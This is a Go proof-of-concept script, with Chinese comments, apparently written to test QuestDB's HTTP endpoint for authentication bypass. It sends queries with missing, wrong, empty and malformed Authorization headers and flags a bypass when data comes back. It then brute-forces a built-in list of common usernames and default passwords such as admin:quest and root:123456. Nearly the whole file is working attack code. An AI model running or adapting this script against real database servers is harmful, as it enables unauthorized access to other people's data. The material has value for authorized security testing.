package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

var (
	colorRed   = "\033[31m"
	colorReset = "\033[0m"

	baseURL = "http://localhost:9000/exec?query=SELECT+1"

	users     = []string{"admin", "quest", "root", "user", "test"}
	passwords = []string{"quest", "password", "admin", "123456", "questdb", ""}

	tests = []TestCase{
		{
			Name:       "无认证头",
			SetAuth:    func(req *http.Request) {},
			ExpectAuth: true,
		},
		{
			Name: "Basic 错误密码 (admin:wrong)",
			SetAuth: func(req *http.Request) {
				req.SetBasicAuth("admin", "wrong")
			},
			ExpectAuth: true,
		},
		{
			Name: "Basic 空用户名密码 (:)",
			SetAuth: func(req *http.Request) {
				req.SetBasicAuth("", "")
			},
			ExpectAuth: true,
		},
		{
			Name: "Basic admin:quest",
			SetAuth: func(req *http.Request) {
				req.SetBasicAuth("admin", "quest")
			},
			ExpectAuth: false, // 即使密码正确，在启用认证后也只会返回200，这里用于对比
		},
		{
			Name: "Basic quest:password",
			SetAuth: func(req *http.Request) {
				req.SetBasicAuth("quest", "password")
			},
			ExpectAuth: false,
		},
		{
			Name: "Basic root:123456",
			SetAuth: func(req *http.Request) {
				req.SetBasicAuth("root", "123456")
			},
			ExpectAuth: false,
		},
		{
			Name: "畸形 Basic 头 (Basic abc1234567890)",
			SetAuth: func(req *http.Request) {
				req.Header.Set("Authorization", "Basic abc1234567890")
			},
			ExpectAuth: true,
		},
		{
			Name: "空 Authorization 头",
			SetAuth: func(req *http.Request) {
				req.Header.Set("Authorization", "")
			},
			ExpectAuth: true,
		},
	}
)

type TestCase struct {
	Name       string
	SetAuth    func(req *http.Request)
	ExpectAuth bool // 如果认证成功则期望返回 401
}

func main() {
	fmt.Println("*** QuestDB 认证绕过测试 POC ***")
	fmt.Printf("目标: %s\n", baseURL)
	fmt.Println("测试时间:", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Println()

	for _, tc := range tests {
		fmt.Printf("测试: %s\n", tc.Name)

		req, err := http.NewRequest("GET", baseURL, nil)
		if err != nil {
			fmt.Printf("  请求创建失败: %v\n", err)
			continue
		}

		tc.SetAuth(req)

		client := &http.Client{Timeout: 5 * time.Second}

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf(" 请求执行失败: %v\n", err)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		status := resp.StatusCode

		isValid := false

		if status == http.StatusOK {
			var result map[string]interface{}
			if json.Unmarshal(body, &result) == nil {
				if _, ok := result["dataset"]; ok {
					isValid = true
				}
			}
		}

		fmt.Printf("  HTTP 状态码: %d\n", status)
		if isValid {
			fmt.Printf("%s  响应包含有效数据集 (认证绕过成功)%s\n", colorRed, colorReset)
			snippet := string(body)
			if len(snippet) > 100 {
				snippet = snippet[:100] + "..."
			}
			fmt.Printf("  响应预览: %s\n", snippet)
		} else {
			fmt.Println("  响应无效或未返回数据 (认证正常工作或请求失败)")
		}

		if tc.ExpectAuth && status == http.StatusOK && isValid {
			fmt.Printf("%s[!] 漏洞确认: 身份验证绕过。预期应返回 401 Unauthorized，但实际返回 200 OK 且包含有效数据负载。%s\n", colorRed, colorReset)
		}

		if !tc.ExpectAuth && status == http.StatusOK && isValid {
			fmt.Println("预期之内: 该凭据可能有效，但所有请求都成功表明认证未强制")
		}

		if tc.ExpectAuth && status == http.StatusUnauthorized {
			fmt.Println("认证正常工作")
		}
		fmt.Println()
	}

	fmt.Println("*** 批量测试常用凭据 ***")
	for _, user := range users {
		for _, pass := range passwords {
			req, _ := http.NewRequest("GET", baseURL, nil)
			req.SetBasicAuth(user, pass)
			client := &http.Client{Timeout: 3 * time.Second}
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			defer resp.Body.Close()
			status := resp.StatusCode
			if status == http.StatusOK {
				body, _ := io.ReadAll(resp.Body)
				var result map[string]interface{}
				if json.Unmarshal(body, &result) == nil {
					if _, ok := result["dataset"]; ok {
						fmt.Printf("%s  凭据 %s:%s -> 200 OK (有效数据)%s\n", colorRed, user, pass, colorReset)
					}
				}
			}
		}
	}
}
